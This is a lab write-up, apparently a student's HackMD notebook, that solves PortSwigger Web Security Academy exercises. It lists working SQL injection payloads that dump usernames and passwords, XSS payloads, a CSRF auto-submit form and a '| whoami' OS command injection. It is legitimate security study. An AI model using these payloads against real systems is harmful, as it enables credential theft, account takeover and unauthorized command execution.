---
title: 'PortSwigger Web Security LAB'
disqus: hackmd
---

PortSwigger Web Security LAB (持續更新中..)
===


# Table of Contents

[TOC]

# SQL injection

## Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
![image](https://hackmd.io/_uploads/SyKB9UMKT.png)

https://0a1e003a0438320b808a627a00be00fb.web-security-academy.net/

![image](https://hackmd.io/_uploads/H1_ucIztp.png)

### Solution
#### category
1. ALL: https://0a1e003a0438320b808a627a00be00fb.web-security-academy.net/
2. Accessories: /filter?category=Accessories
3. Corporate gifts: /filter?category=Corporate+gifts
4. Gifts: /filter?category=Gifts
5. Pets: /filter?category=Pets

#### product
#### /product?productId=6
![image](https://hackmd.io/_uploads/rkCoeDGta.png)
> [!NOTE]
>:brain: 思考邏輯:\
>題目要求 display one or more unreleased products，所以從category下手
 
### Solved
#### /filter?category=%27+OR+1=1--
![image](https://hackmd.io/_uploads/S1vN-wGYp.png)

![image](https://hackmd.io/_uploads/SJXLZPMta.png)


## Lab: SQL injection vulnerability allowing login bypass
![image](https://hackmd.io/_uploads/Hy_u-vzK6.png)
https://0aad00cc0476e8b8809c5ded00c8008a.web-security-academy.net/

![image](https://hackmd.io/_uploads/ByuGMvMtp.png)

### Solution
> [!NOTE]
>:brain: 思考邏輯:\
>題目要求 administrator user 登入，所以從My account下手

#### My accoumt
/login
![image](https://hackmd.io/_uploads/HybLMwfYp.png)

> ' OR 1=1 --
> chw (pwd)

![image](https://hackmd.io/_uploads/HJLtzDGYa.png)

### Solved
#### /my-account?id=administrator
![image](https://hackmd.io/_uploads/BJS3MvfF6.png)
![image](https://hackmd.io/_uploads/S18NmPzYa.png)

## Lab: SQL injection attack, querying the database type and version on Oracle
![image](https://hackmd.io/_uploads/SJ6I7wzF6.png)
(HINT)
![image](https://hackmd.io/_uploads/BJTq_PzF6.png)

https://0aac000904b8c94980841c6d00bd0069.web-security-academy.net/
![image](https://hackmd.io/_uploads/By0FmwGYT.png)

### Solution
> [!NOTE]
>:brain: 思考邏輯:\
>題目要求 UNION attack to retrieve the results，所以創建一個虛擬dual table，再使用 UNION SELECT

● https://portswigger.net/web-security/sql-injection/cheat-sheet
![image](https://hackmd.io/_uploads/HJuANvfFT.png)

● [dual是一個虛擬表格，用來構成select的語法規則，oracle保證dual裡面永遠只有一筆記錄。](https://blog.csdn.net/skyly84/article/details/4887015)
#### /filter?category='+UNION+SELECT+'dev','core'+FROM+dual--
![image](https://hackmd.io/_uploads/BywP8wGYp.png)
> 成功，能確認select中有兩個column

### Solved
#### /filter?category='+UNION+SELECT+BANNER,+NULL+FROM+v$version--
![image](https://hackmd.io/_uploads/rJFvdwMFp.png)
![image](https://hackmd.io/_uploads/BJ0uOvzY6.png)

## Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft
![image](https://hackmd.io/_uploads/ryd7tPfKa.png)

https://0abb008204f9aca180d54e430064009d.web-security-academy.net/
![image](https://hackmd.io/_uploads/HJf7CDzta.png)

### Solution
> [!NOTE]
>:brain: 思考邏輯:\
>題目要求使用 UNION attack 顯示 database version，所以先確認UNION SELECT 可以運作，再透過 @@version 找出 DB version

#### 1. /filter?category=Gifts%27+UNION+SELECT+%27dev%27,%27core%27--
![image](https://hackmd.io/_uploads/H16BRPGKa.png)

[MySQL Comment](https://dev.mysql.com/doc/refman/8.0/en/comments.html)
> MySQL Server supports three comment styles:\
● From a # character to the end of the line.\
● From a --  sequence to the end of the line. In MySQL, the --  (double-dash) comment style requires the second dash to be followed by at least one whitespace or control character (such as a space, tab, newline, and so on).

#### 2. /filter?category=Pets%27%20UNION%20SELECT%20%27abc%27,%27def%27--%20
![image](https://hackmd.io/_uploads/ryUIx_MFa.png)
![image](https://hackmd.io/_uploads/BkV5lOzKT.png)

### Solved
#### /filter?category=Pets%27+UNION+SELECT%20@@version,%20NULL--%20
![image](https://hackmd.io/_uploads/HJgFZdzt6.png)
![image](https://hackmd.io/_uploads/SJoqWuMta.png)

## Lab: SQL injection attack, listing the database contents on non-Oracle databases
![image](https://hackmd.io/_uploads/SyWRZdMFa.png)

https://0a28008b03c30d358415a6c0001f0033.web-security-academy.net/
![image](https://hackmd.io/_uploads/ryteMOft6.png)
### Solution
> [!NOTE]
>:brain: 思考邏輯:\
>題目要求使用 UNION attack 檢索，並使用administrator登入。所以先確認UNION SELECT 可以運作，再透過查詢 information_schema.tables 看 table 內容 ， 最後在table: users_jlkbxy中找到administrator。

#### 1. /filter?category=Gifts'+UNION+SELECT+'dev','core'--
![image](https://hackmd.io/_uploads/HyTHhFftp.png)
![image](https://hackmd.io/_uploads/ryO8htGYT.png)

#### 2. /filter?category=Gifts'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--
![image](https://hackmd.io/_uploads/SkMt3FGK6.png)
![image](https://hackmd.io/_uploads/HyBBpFzYa.png)

#### 3. /filter?category=Gift'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='pg_user'--
![image](https://hackmd.io/_uploads/Bkz_pKzK6.png)

#### 4. /filter?category=%27+UNION+SELECT+usename,+passwd+FROM+pg_user--
![image](https://hackmd.io/_uploads/SkGxeqfFT.png)
> 沒找到，可能是找錯Table

#### 5. /filter?category=Gifts%27+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name=%27users_jlkbxy%27--
![image](https://hackmd.io/_uploads/S1QQzqft6.png)

#### 6. /filter?category=%27+UNION+SELECT+username_fryeje,+password_tpgbyn+FROM+users_jlkbxy--
![image](https://hackmd.io/_uploads/SJFPMcGKa.png)

### Solved
LOGIN
![image](https://hackmd.io/_uploads/Hkx5z9GYT.png)
![image](https://hackmd.io/_uploads/B1Mdtjft6.png)

## Lab: SQL injection attack, listing the database contents on Oracle
![image](https://hackmd.io/_uploads/SJeqcizFa.png)
https://0a910058049642e28030a39200f90094.web-security-academy.net/
![image](https://hackmd.io/_uploads/rJDDqjfYp.png)

### Solution
> [!NOTE]
> :brain: 思考邏輯:\
>題目要求使用 UNION attack 檢索，並使用administrator登入。所以先確認UNION SELECT 可以運作，UNION直接查詢失敗，因此透過dual。成功後查詢 all_tables 看 table 內容 ， 在USERS_BQWGCF table中找到 PASSWORD_WJKNLN 、 USERNAME_TLMZIY，最後在以上兩個column中找到administrator。

#### 1. /filter?category=Lifestyle'+UNION+SELECT+'dev','core'+FROM+dual--
![image](https://hackmd.io/_uploads/BJVWjiftT.png)
![image](https://hackmd.io/_uploads/rJgfsoMFT.png)
#### 2. /filter?category=Lifestyle'+UNION+SELECT+table_name,NULL+FROM+all_tables--
![image](https://hackmd.io/_uploads/SkLrisGK6.png)
![image](https://hackmd.io/_uploads/HyDKssMF6.png)
> Find USERS_BQWGCF

#### 3. /filter?category=Lifestyle'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_BQWGCF'--
![image](https://hackmd.io/_uploads/rJay2izF6.png)
![image](https://hackmd.io/_uploads/r1senoftp.png)
> Find PASSWORD_WJKNLN & USERNAME_TLMZIY

#### 4. /filter?category=Lifestyle'+UNION+SELECT+USERNAME_TLMZIY,+PASSWORD_WJKNLN+FROM+USERS_BQWGCF
![image](https://hackmd.io/_uploads/ryJ93jGFT.png)
![image](https://hackmd.io/_uploads/Skac3sGFp.png)

### Solved
LOGIN
![image](https://hackmd.io/_uploads/rJhRnifFa.png)
![image](https://hackmd.io/_uploads/BkxlaizF6.png)

## Lab: SQL injection UNION attack, determining the number of columns returned by the query
![image](https://hackmd.io/_uploads/BJD7ToGtp.png)
https://0a6e00ec03296628809ef36d00e800ff.web-security-academy.net/
![image](https://hackmd.io/_uploads/BknHasfKT.png)

### Solution
> [!NOTE]
> :brain: 思考邏輯:\
>題目要求使用 null values 來確認 column數量。所以先確認塞入 NULL 回應500，繼續增加空值，直到Error 消失。

#### /filter?category=Accessories'+UNION+SELECT+NULL--
![image](https://hackmd.io/_uploads/ByecaoftT.png)
> 塞入column NULL數量

#### /filter?category=Accessories%27+UNION+SELECT+NULL,NULL--
![image](https://hackmd.io/_uploads/r1xWAjzYT.png)
> 繼續塞入NULL

### Solved
#### /filter?category=Accessories%27+UNION+SELECT+NULL,NULL,NULL--
![image](https://hackmd.io/_uploads/Sy_4RozFT.png)
![image](https://hackmd.io/_uploads/r1nPCoftT.png)

## Lab: SQL injection UNION attack, finding a column containing text
![image](https://hackmd.io/_uploads/rkTiAoGKa.png)
https://0a70000504d85146816858c800a300d0.web-security-academy.net/
![image](https://hackmd.io/_uploads/BkE0AsMFp.png)

### Solution
> [!NOTE]
> :brain: 思考邏輯:\
>題目建議使用 UNION attack 來回傳row containing the value provided。所以使用上題技巧，先確認塞入 NULL 回應500，繼續增加空值，直到Error 消失。確認存在三個row後，依序將值塞入三個column，跳出Make the database retrieve the string: '7ztQnM'提示。

#### /filter?category=Gifts%27+UNION+SELECT+NULL--
> Internal Server Error
#### /filter?category=Gifts%27+UNION+SELECT+NULL,NULL--
> Internal Server Error
#### /filter?category=Gifts%27+UNION+SELECT+NULL,NULL,NULL--
![image](https://hackmd.io/_uploads/SJ-hJnfFp.png)
> 成功，接著將值塞入NULL 測試

#### /filter?category=Gifts%27+UNION+SELECT+'chw',NULL,NULL--
> Internal Server Error
#### /filter?category=Gifts%27+UNION+SELECT+NULL,'chw',NULL--
![image](https://hackmd.io/_uploads/B1mLx3zF6.png)
> 得知第二個column存在value
### Solved
#### /filter?category=Gifts/filter?category=Gifts%27+UNION+SELECT+NULL,%277ztQnM%27,NULL--
![image](https://hackmd.io/_uploads/rkB1WhGKp.png)
![image](https://hackmd.io/_uploads/HJ7l-2fYp.png)

## Lab: SQL injection UNION attack, retrieving data from other tables
![image](https://hackmd.io/_uploads/SkYzb2GYT.png)
https://0a3b0035040e86dd80a79e3400ce00cb.web-security-academy.net/
![image](https://hackmd.io/_uploads/r19Ib3GK6.png)

### Solution
> [!NOTE]
> :brain: 思考邏輯:\
>題目提示database存在不同users table，column存在username & password，使用administrator登入。因此使用UNION SELECT from users，得到administrator與密碼。

#### /filter?category=Accessories'+UNION+SELECT+'chw','dev'--
![image](https://hackmd.io/_uploads/H1OcZhMta.png)
![image](https://hackmd.io/_uploads/HJzo-2zFa.png)
#### /filter?category=Accessories'+UNION+SELECT+username,+password+FROM+users--
![image](https://hackmd.io/_uploads/BJWgz2GFp.png)
### Solved
LOGIN
![image](https://hackmd.io/_uploads/r1KMfhGt6.png)
![image](https://hackmd.io/_uploads/SJIHf3MF6.png)

## Lab: SQL injection UNION attack, retrieving multiple values in a single column
![image](https://hackmd.io/_uploads/HJcIMnfFT.png)
https://0aa600d20347897d8079625c00720016.web-security-academy.net/
![image](https://hackmd.io/_uploads/Bk2FM2zF6.png)

### Solution
> [!NOTE]
> :brain: 思考邏輯:\
>題目提示與上提相同，DB存在不同users table，column存在username & password，標題提到 **multiple values in a single column**。收先塞入NULL確認column數量，確認後，Cheatsheet 中提到可以使用 'foo'||'bar' 將multiple strings串成single string，得到administrator與密碼。

#### 測試 /filter?category=Pets'+UNION+SELECT+'chw','dev'--
> Internal Server Error 確實不符
#### /filter?category=Pets'+UNION+SELECT+NULL,'chw'--
![image](https://hackmd.io/_uploads/BJAQX2zKa.png)
● [SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
![image](https://hackmd.io/_uploads/BkI2XhfKa.png)

#### /filter?category=Pets' UNION SELECT NULL,username| |'~'||password FROM users--
![image](https://hackmd.io/_uploads/H1FKNhGK6.png)
```
可以看到||'~'||，代表輸出資料將username與password之間用 ~ 為間隔
若使用/filter?category=Pets' UNION SELECT NULL,username||'%20'||password FROM users--
將會以空格隔開。
```
### Solved
LOGIN
![image](https://hackmd.io/_uploads/HJFhV3zK6.png)
![image](https://hackmd.io/_uploads/Hkqp4nfFa.png)

## Lab: Blind SQL injection with conditional responses
![image](https://hackmd.io/_uploads/ByG-BhGYa.png)
https://0a40004a048c456381f3fa64004f002d.web-security-academy.net/
![image](https://hackmd.io/_uploads/ryHfr2zF6.png)

### Solution
#### Modify TrackingID (Cookie)
![image](https://hackmd.io/_uploads/S1vsr2GYT.png)
![image](https://hackmd.io/_uploads/rk6182MKT.png)
> Welcome back! 
> 成功登入

#### ' AND (SELECT 'chw' FROM users LIMIT 1)='chw
![image](https://hackmd.io/_uploads/SJYew3MKp.png)
> 驗證是否存在users table 
> 存在
#### ' AND (SELECT 'chw' FROM users WHERE username='administrator')='chw
![image](https://hackmd.io/_uploads/BJ-UvnMKa.png)
> 驗證是否存在administrator
> 存在
#### ' AND (SELECT 'chw' FROM users WHERE username='administrator' AND LENGTH(password)>1)='chw
> 驗證密碼是否大於1,3,5,10, 20(20錯誤)
> 驗證密碼是否大於19，密碼共20個字元

#### ' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='§a§
![image](https://hackmd.io/_uploads/rJTmHsXFT.png)

![image](https://hackmd.io/_uploads/BkJ0IoQFa.png)
> 得知passwd 第一個個字元是'k'

#### Brute force passwd
![image](https://hackmd.io/_uploads/H1rhPomFp.png)

![image](https://hackmd.io/_uploads/rkD7_sQFp.png)
> ![image](https://hackmd.io/_uploads/rkP7Fi7Fa.png)
![image](https://hackmd.io/_uploads/Hy24Yimtp.png)
![image](https://hackmd.io/_uploads/rJdItsmFT.png)
![image](https://hackmd.io/_uploads/SyGYFsQF6.png)
![image](https://hackmd.io/_uploads/ryDctjXY6.png)
![image](https://hackmd.io/_uploads/Byr2FsQtT.png)
![image](https://hackmd.io/_uploads/SJxycoQYT.png)
![image](https://hackmd.io/_uploads/HyZl5sQtp.png)
![image](https://hackmd.io/_uploads/H1Wne3mtp.png)
![image](https://hackmd.io/_uploads/r12TlhQFp.png)
![image](https://hackmd.io/_uploads/r1sAg27YT.png)
![image](https://hackmd.io/_uploads/r1TlbnXKT.png)
![image](https://hackmd.io/_uploads/rkfM-h7ta.png)
![image](https://hackmd.io/_uploads/BJxmWnmKT.png)
![image](https://hackmd.io/_uploads/ryH4-h7Fa.png)
![image](https://hackmd.io/_uploads/BJPI-3Xtp.png)
![image](https://hackmd.io/_uploads/H1OPWn7Ya.png)
![image](https://hackmd.io/_uploads/SkIuZh7Yp.png)
![image](https://hackmd.io/_uploads/HkNj-hQF6.png)
![image](https://hackmd.io/_uploads/rJVnZh7F6.png)
得出password: **kn641bixzlp0wv3g6aj3**

### Solved
LOGIN
![image](https://hackmd.io/_uploads/S1gMm27t6.png)
![image](https://hackmd.io/_uploads/HkyUrnXKp.png)

## Lab: Blind SQL injection with conditional errors
![image](https://hackmd.io/_uploads/SJ7cS3mF6.png)
https://0ac90001042da74480137bc500e500b6.web-security-academy.net/
![image](https://hackmd.io/_uploads/SyGe8hQta.png)

### Solution

# Cross-site scripting
## Lab: Reflected XSS into HTML context with nothing encoded
![image](https://hackmd.io/_uploads/Hy9B8hXta.png)
https://0ad3002b03601a0a80e19ecc0054007f.web-security-academy.net/
![image](https://hackmd.io/_uploads/B11vUnmtp.png)

### Solution
#### chw
![image](https://hackmd.io/_uploads/B1Qj8hQYT.png)
> /?search=chw
### Solved
#### /?search=<script>alert(1)</script>
![image](https://hackmd.io/_uploads/BkiT83mta.png)
![image](https://hackmd.io/_uploads/H10kP2mFp.png)

![image](https://hackmd.io/_uploads/HJ8zv3XtT.png)

## Lab: Stored XSS into HTML context with nothing encoded
![image](https://hackmd.io/_uploads/rkX4P3XK6.png)
https://0ac100470488653e80f18a0b002f00aa.web-security-academy.net/
![image](https://hackmd.io/_uploads/SyqSwhmtT.png)

### Solution
#### Leave Comment
> /post?postId=6

![image](https://hackmd.io/_uploads/H1dpvn7Ka.png)
> /post/comment/confirmation?postId=6

### Solved
![image](https://hackmd.io/_uploads/S1PyuhQYa.png)
![image](https://hackmd.io/_uploads/BJ-zunmKT.png)

## Lab: DOM XSS in document.write sink using source location.search
![image](https://hackmd.io/_uploads/ryr4u37K6.png)
https://0a33005d04b65f7b81323478009c00bc.web-security-academy.net/

![image](https://hackmd.io/_uploads/SktwuhmYp.png)

### Solution
#### chw
![image](https://hackmd.io/_uploads/B10AY2XKa.png)
#### /?search=<script>alert(1)</script>
![image](https://hackmd.io/_uploads/S15xqhmtT.png)
> 失敗

![image](https://hackmd.io/_uploads/BkWmcnXtT.png)
> search字串被放進img src
### Solved
#### /?search=%27">%27<script>alert(1)</script>
閉合img src
![image](https://hackmd.io/_uploads/HyPIs2Xta.png)
![image](https://hackmd.io/_uploads/Hk_wjh7Ya.png)

![image](https://hackmd.io/_uploads/Bkbuo3mYT.png)

## Lab: DOM XSS in innerHTML sink using source location.search
![image](https://hackmd.io/_uploads/Sk4423QKa.png)
https://0af7007703ac9b3780819ea1008f0019.web-security-academy.net/
![image](https://hackmd.io/_uploads/S1oBnhQFa.png)

### Solution
#### Element
![image](https://hackmd.io/_uploads/B16v4TQta.png)
#### <img src=1 onerror=alert(1)>
![image](https://hackmd.io/_uploads/r1sqNpQYa.png)

![image](https://hackmd.io/_uploads/H1PsVpQtp.png)
### Solved
![image](https://hackmd.io/_uploads/ryw3EpQF6.png)
![image](https://hackmd.io/_uploads/B16pN67Yp.png)

## Lab: DOM XSS in jQuery anchor href attribute sink using location.search source
![image](https://hackmd.io/_uploads/BJY1HamFa.png)
https://0a09002b03b608f18056e953009f00a2.web-security-academy.net/
![image](https://hackmd.io/_uploads/ryZZrpQK6.png)

### Solution
#### /feedback?returnPath=/
![image](https://hackmd.io/_uploads/ryvnkCmKp.png)

#### /feedback?returnPath=chw
![image](https://hackmd.io/_uploads/Hkq1gAXFT.png)
> payload被存在href中

### Solved
#### /feedback?returnPath=javascript:<script>alert(1)</script>
![image](https://hackmd.io/_uploads/rJW_gCmKp.png)

![image](https://hackmd.io/_uploads/HJG5lCmY6.png)

## Lab: DOM XSS in jQuery selector sink using a hashchange event
![image](https://hackmd.io/_uploads/rkN3x0XYT.png)
https://0a9f00a804db45d786102d66004c0035.web-security-academy.net/
![image](https://hackmd.io/_uploads/HyXTg0mtT.png)

### Solution
#### Go to exploit server
![image](https://hackmd.io/_uploads/HyLB-0XtT.png)
https://exploit-0a4100ea04b54542868a2cff014700f2.exploit-server.net/
![image](https://hackmd.io/_uploads/SkFIZRXY6.png)

#### Insert iframe in Body
```html=
Hello, world!
<iframe src="https://0a9f00a804db45d786102d66004c0035.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
```
![image](https://hackmd.io/_uploads/SyvbmAmKa.png)

![image](https://hackmd.io/_uploads/HJReGR7Fp.png)
(View exploit)
![image](https://hackmd.io/_uploads/HJUrz0mYp.png)
> 成功呼叫print()

### Solved
#### Click Deliver exploit yo victim
![image](https://hackmd.io/_uploads/BJl5NXRXK6.png)

![image](https://hackmd.io/_uploads/Hkeum0mtp.png)

## Lab: Reflected XSS into attribute with angle brackets HTML-encoded
![image](https://hackmd.io/_uploads/HkIqmCXYp.png)
https://0a6800d903ef83ae812002cf00ed0095.web-security-academy.net/

![image](https://hackmd.io/_uploads/SJ-CX07Fp.png)
### Solution & Solved
#### "onmouseover="alert(1)
![image](https://hackmd.io/_uploads/rJdmV0XKp.png)
![image](https://hackmd.io/_uploads/S1tOECXKT.png)

## Lab: Stored XSS into anchor href attribute with double quotes HTML-encoded
![image](https://hackmd.io/_uploads/BJ0yr0mFT.png)
https://0a3b00190379b5d982f16fa900e900e5.web-security-academy.net/
![image](https://hackmd.io/_uploads/BJdbrC7tp.png)

### Solution
#### /post?postId=8 POST Comment
![image](https://hackmd.io/_uploads/HkDHHAXtT.png)
(POST 1次)
![image](https://hackmd.io/_uploads/SJlxLRQYa.png)
(POST 2次)
![image](https://hackmd.io/_uploads/BJYmLCQKa.png)
> /post/comment/confirmation?postId=8

#### **在第二次POST 塞進href中**
![image](https://hackmd.io/_uploads/B1M680XF6.png)

# Cross-site request forgery (CSRF)
## Lab: CSRF vulnerability with no defenses
![image](https://hackmd.io/_uploads/ByWSgI8KT.png)
https://0ae8009903b0aae4803a3087004600a4.web-security-academy.net/
![image](https://hackmd.io/_uploads/S1LgZUIta.png)

### Solution
#### Go to exploit server
https://exploit-0a68009503c6aa94800d2f9e017600f7.exploit-server.net/
![image](https://hackmd.io/_uploads/r1_NbILY6.png)
#### Edit body
![image](https://hackmd.io/_uploads/HJd9-LUFp.png)
```html=
<form method="POST" action="https://0ae8009903b0aae4803a3087004600a4.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="anything%40web-security-academy.net">
</form>
<script>
        document.forms[0].submit();
</script>
```

#### POST 


# OS command injection
## Lab: OS command injection, simple case
![image](https://hackmd.io/_uploads/SJluK8pzYp.png)

### Solution
![image](https://hackmd.io/_uploads/HyiCv6MKa.png)
**(Click "Check stock")**
![image](https://hackmd.io/_uploads/SktpwTGYT.png)
> productId=3&storeId=1| whoami

### Solved
![image](https://hackmd.io/_uploads/r19rOpGYT.png)
![image](https://hackmd.io/_uploads/rJGHuTzKT.png)

![image](https://hackmd.io/_uploads/rkC_d6Mt6.png)

